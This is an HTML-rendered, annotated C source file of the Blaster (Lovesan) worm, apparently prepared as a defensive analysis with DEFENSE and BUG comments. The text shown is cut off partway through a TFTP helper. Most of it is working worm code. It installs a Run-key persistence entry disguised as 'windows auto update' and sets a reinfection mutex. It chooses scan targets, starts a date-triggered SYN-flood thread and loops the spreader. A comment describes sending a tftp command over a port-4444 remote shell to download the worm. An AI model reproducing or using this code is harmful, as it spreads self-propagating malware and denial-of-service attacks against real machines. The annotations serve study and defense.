<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Win32.Lovesan.a - blaster.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#include &lt;winsock2.h&gt;
#include &lt;ws2tcpip.h&gt; </span><span class="sc1">/*IP_HDRINCL*/</span><span class="sc0">
</span><span class="sc9">#include &lt;wininet.h&gt; </span><span class="sc1">/*InternetGetConnectedState*/</span><span class="sc0">
</span><span class="sc9">#include &lt;stdio.h&gt;
</span><span class="sc0">
</span><span class="sc9">#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "wininet.lib")
#pragma comment (lib, "advapi32.lib")
</span><span class="sc0">

</span><span class="sc1">/*
* These strings aren't used in the worm, Buford put them here
* so that whitehat researchers would discover them.
* BUFORD: Note that both of these messages are the typical
* behavior of a teenager who recently discovered love, and
* is in the normal teenage mode of challenging authority.
*/</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">msg1</span><span class="sc10">[]=</span><span class="sc6">"I just want to say LOVE YOU SAN!!"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">msg2</span><span class="sc10">[]=</span><span class="sc6">"billy gates why do you make this possible ?"</span><span class="sc0">
</span><span class="sc6">" Stop making money and fix your software!!"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc1">/*
* Buford probably put the worm name as a "define" at the top
* of his program so that he could change the name at any time.
* 2003-09-29: This is the string that Parson changed.
*/</span><span class="sc0">
</span><span class="sc9">#define MSBLAST_EXE "msblast.exe"
</span><span class="sc0">
</span><span class="sc1">/*
* MS-RPC/DCOM runs over port 135.
* DEFENSE: firewalling port 135 will prevent systems from
* being exploited and will hinder the spread of this worm.
*/</span><span class="sc0">
</span><span class="sc9">#define MSRCP_PORT_135 135
</span><span class="sc0">
</span><span class="sc1">/*
* The TFTP protocol is defined to run on port 69. Once this
* worm breaks into a victim, it will command it to download
* the worm via TFTP. Therefore, the worms briefly runs a
* TFTP service to deliver that file.
* DEFENSE: firewalling 69/udp will prevent the worm from
* fully infected a host.
*/</span><span class="sc0">
</span><span class="sc9">#define TFTP_PORT_69 69
</span><span class="sc0">
</span><span class="sc1">/*
* The shell-prompt is established over port 4444. The 
* exploit code (in the variable 'sc') commands the victim
* to "bind a shell" on this port. The exploit then connects
* to that port to send commands, such as TFTPing the 
* msblast.exe file down and launching it.
* DEFENSE: firewalling 4444/tcp will prevent the worm from
* spreading.
*/</span><span class="sc0">
</span><span class="sc9">#define SHELL_PORT_4444 4444
</span><span class="sc0">

</span><span class="sc1">/*
* A simple string to hold the current IP address
*/</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">target_ip_string</span><span class="sc10">[</span><span class="sc4">16</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc1">/*
* A global variable to hold the socket for the TFTP service.
*/</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd_tftp_service</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* 
* Global flag to indicate this thread is running. This
* is set when the thread starts, then is cleared when
* the thread is about to end.
* This demonstrates that Buford isn't confident with
* multi-threaded programming -- he should just check
* the thread handle.
*/</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">is_tftp_running</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* 
* When delivering the worm file to the victim, it gets the
* name by querying itself using GetModuleFilename(). This
* makes it easier to change the filename or to launch the
* worm. */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">msblast_filename</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">+</span><span class="sc4">4</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ClassD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ClassC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ClassB</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ClassA</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">local_class_a</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">local_class_b</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">winxp1_or_win2k2</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">blaster_DoS_thread</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">blaster_spreader</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">blaster_exploit_target</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">victim_ip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">blaster_send_syn_packet</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">target_ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc3">/*************************************************************** 
* This is where the 'msblast.exe' program starts running
***************************************************************/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0"> 
</span><span class="sc11">WSADATA</span><span class="sc0"> </span><span class="sc11">WSAData</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">myhostname</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0"> 
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">daystring</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">monthstring</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">];</span><span class="sc0"> 
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ThreadId</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">scan_local</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> 

</span><span class="sc1">/*
* Create a registry key that will cause this worm
* to run every time the system restarts.
* DEFENSE: Slammer was "memory-resident" and could
* be cleaned by simply rebooting the machine.
* Cleaning this worm requires this registry entry
* to be deleted.
*/</span><span class="sc0">
</span><span class="sc11">RegCreateKeyEx</span><span class="sc10">(</span><span class="sc0">
</span><span class="sc1">/*hKey*/</span><span class="sc0"> </span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc1">/*lpSubKey*/</span><span class="sc0"> </span><span class="sc6">"SOFTWARE\\Microsoft\\Windows\\"</span><span class="sc0">
</span><span class="sc6">"CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc1">/*Reserved*/</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc1">/*lpClass*/</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc1">/*dwOptions*/</span><span class="sc0"> </span><span class="sc11">REG_OPTION_NON_VOLATILE</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc1">/*samDesired */</span><span class="sc0"> </span><span class="sc11">KEY_ALL_ACCESS</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc1">/*lpSecurityAttributes*/</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc1">/*phkResult */</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc1">/*lpdwDisposition */</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegSetValueExA</span><span class="sc10">(</span><span class="sc0">
</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc6">"windows auto update"</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">MSBLAST_EXE</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">50</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0"> 


</span><span class="sc1">/*
* Make sure this isn't a second infection. A common problem
* with worms is that they sometimes re-infect the same
* victim repeatedly, eventually crashing it. A crashed 
* system cannot spread the worm. Therefore, worm writers
* now make sure to prevent reinfections. The way Blaster
* does this is by creating a system "global" object called
* "BILLY". If another program in the computer has already
* created "BILLY", then this instance won't run.
* DEFENSE: this implies that you can remove Blaster by 
* creating a mutex named "BILLY". When the computer 
* restarts, Blaster will falsely believe that it has
* already infected the system and will quit. 
*/</span><span class="sc0">
</span><span class="sc11">CreateMutexA</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BILLY"</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetLastError</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_ALREADY_EXISTS</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> 

</span><span class="sc1">/*
* Windows systems requires "WinSock" (the network API layer)
* to be initialized. Note that the SYNflood attack requires
* raw sockets to be initialized, which only works in
* version 2.2 of WinSock.
* BUFORD: The following initialization is needlessly
* complicated, and is typical of programmers who are unsure
* of their knowledge of sockets..
*/</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">MAKEWORD</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">WSAData</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">
</span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">MAKEWORD</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">WSAData</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">
</span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">WSAData</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*
* The worm needs to read itself from the disk when 
* transferring to the victim. Rather than using a hard-coded
* location, it discovered the location of itself dynamically
* through this function call. This has the side effect of
* making it easier to change the name of the worm, as well
* as making it easier to launch it.
*/</span><span class="sc0">
</span><span class="sc11">GetModuleFileNameA</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">msblast_filename</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">msblast_filename</span><span class="sc10">));</span><span class="sc0"> 

</span><span class="sc1">/*
* When the worm infects a dialup machine, every time the user
* restarts their machine, the worm's network communication
* will cause annoying 'dial' popups for the user. This will
* make them suspect their machine is infected.
* The function call below makes sure that the worm only
* starts running once the connection to the Internet
* has been established and not before.
* BUFORD: I think Buford tested out his code on a machine
* and discovered this problem. Even though much of the
* code indicates he didn't spend much time on
* testing his worm, this line indicates that he did
* at least a little bit of testing.
*/</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">InternetGetConnectedState</span><span class="sc10">(&amp;</span><span class="sc11">ThreadId</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">20000</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/*wait 20 seconds and try again */</span><span class="sc0">

</span><span class="sc1">/*
* Initialize the low-order byte of target IP address to 0.
*/</span><span class="sc0">
</span><span class="sc11">ClassD</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*
* The worm must make decisions "randomly": each worm must
* choose different systems to infect. In order to make
* random choices, the programmer must "seed" the random
* number generator. The typical way to do this is by
* seeding it with the current timestamp.
* BUFORD: Later in this code you'll find that Buford calls
* 'srand()' many times to reseed. This is largely
* unnecessary, and again indicates that Buford is not 
* confident in his programming skills, so he constantly
* reseeds the generator in order to make extra sure he
* has gotten it right.
*/</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0"> 

</span><span class="sc1">/*
* This initializes the "local" network to some random
* value. The code below will attempt to figure out what
* the true local network is -- but just in case it fails,
* the initialization fails, using random values makes sure
* the worm won't do something stupid, such as scan the
* network around 0.0.0.0
*/</span><span class="sc0">
</span><span class="sc11">local_class_a</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">254</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc11">local_class_b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">254</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> 

</span><span class="sc1">/*
* This discovers the local IP address used currently by this
* victim machine. Blaster randomly chooses to either infect
* just the local ClassB network, or some other network,
* therefore it needs to know the local network.
* BUFORD: The worm writer uses a complex way to print out
* the IP address into a string, then parse it back again
* to a number. This demonstrates that Buford is fairly
* new to C programming: he thinks in terms of the printed
* representation of the IP address rather than in its
* binary form.
*/</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">gethostname</span><span class="sc10">(</span><span class="sc11">myhostname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">myhostname</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HOSTENT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p_hostent</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">myhostname</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p_hostent</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">p_hostent</span><span class="sc10">-&gt;</span><span class="sc11">h_addr</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p_addr_item</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">in</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">p_hostent</span><span class="sc10">-&gt;</span><span class="sc11">h_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">myhostname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">));</span><span class="sc0"> 

</span><span class="sc11">p_addr_item</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strtok</span><span class="sc10">(</span><span class="sc11">myhostname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ClassA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">p_addr_item</span><span class="sc10">);</span><span class="sc0"> 

</span><span class="sc11">p_addr_item</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strtok</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ClassB</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">p_addr_item</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">p_addr_item</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strtok</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ClassC</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">p_addr_item</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ClassC</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> 
</span><span class="sc1">/* When starting from victim's address range, 
* try to start a little bit behind. This is
* important because the scanning logic only
* move forward. */</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0"> 
</span><span class="sc11">ClassC</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0"> 
</span><span class="sc11">local_class_a</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ClassA</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc11">local_class_b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ClassB</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc11">scan_local</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*
* This chooses whether Blaster will scan just the local
* network (40% chance) or a random network (60% chance)
*/</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0"> 
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">12</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc11">scan_local</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*
* The known exploits require the hacker to indicate whether 
* the victim is WinXP or Win2k. The worm has to guess. The
* way it guesses is that it chooses randomly. 80% of the time
* it will assume that all victims are WinXP, and 20% of the
* time it will assume all victims are Win2k. This means that
* propogation among Win2k machines will be slowed down by
* the fact Win2k machines are getting DoSed faster than they
* are getting exploited. 
*/</span><span class="sc0">
</span><span class="sc11">winxp1_or_win2k2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc11">winxp1_or_win2k2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> 

</span><span class="sc1">/*
* If not scanning locally, then choose a random IP address
* to start with.
* BUG: this worm choose bad ranges above 224. This will 
* cause a bunch of unnecessary multicast traffic. Weird
* multicast traffic has historically been an easy way of 
* detecting worm activity.
*/</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">scan_local</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> 
</span><span class="sc11">ClassA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">254</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc11">ClassB</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">254</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc11">ClassC</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">254</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*
* Check the date so that when in the certain range, it will 
* trigger a DoS attack against Micosoft. The following
* times will trigger the DoS attack:
* Aug 16 through Aug 31
* Spt 16 through Spt 30
* Oct 16 through Oct 31
* Nov 16 through Nov 30
* Dec 16 through Dec 31
* This applies to all years, and is based on local time.
* FAQ: The worm is based on "local", not "global" time.
* That means the DoS attack will start from Japan,
* then Asia, then Europe, then the United States as the
* time moves across the globe.
*/</span><span class="sc0">
</span><span class="sc9">#define MYLANG MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT)
#define LOCALE_409 MAKELCID(MYLANG, SORT_DEFAULT)
</span><span class="sc11">GetDateFormat</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">LOCALE_409</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc1">/*localtime, not GMT*/</span><span class="sc0"> 
</span><span class="sc6">"d"</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">daystring</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">daystring</span><span class="sc10">));</span><span class="sc0"> 
</span><span class="sc11">GetDateFormat</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">LOCALE_409</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc1">/*localtime, not GMT*/</span><span class="sc0"> 
</span><span class="sc6">"M"</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">monthstring</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">monthstring</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">daystring</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">monthstring</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">blaster_DoS_thread</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ThreadId</span><span class="sc10">);</span><span class="sc0"> 

</span><span class="sc1">/*
* As the final task of the program, go into worm mode
* trying to infect systems.
*/</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;;)</span><span class="sc0">
</span><span class="sc11">blaster_spreader</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc1">/*
* It'll never reach this point, but in theory, you need a
* WSACleanup() after a WSAStartup().
*/</span><span class="sc0">
</span><span class="sc11">WSACleanup</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> 



</span><span class="sc1">/*
* This will be called from CreateThread in the main worm body
* right after it connects to port 4444. After the thread is 
* started, it then sends the string "
* tftp -i %d.%d.%d.%d GET msblast.exe" (where the %ds represents
* the IP address of the attacker).
* Once it sends the string, it then waits for 20 seconds for the
* TFTP server to end. If the TFTP server doesn't end, it calls
* TerminateThread.
*/</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">blaster_tftp_thread</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc1">/*
* This is the protocol format of a TFTP packet. This isn't
* used in the code -- I just provide it here for reference
*/</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">TFTP_Packet</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
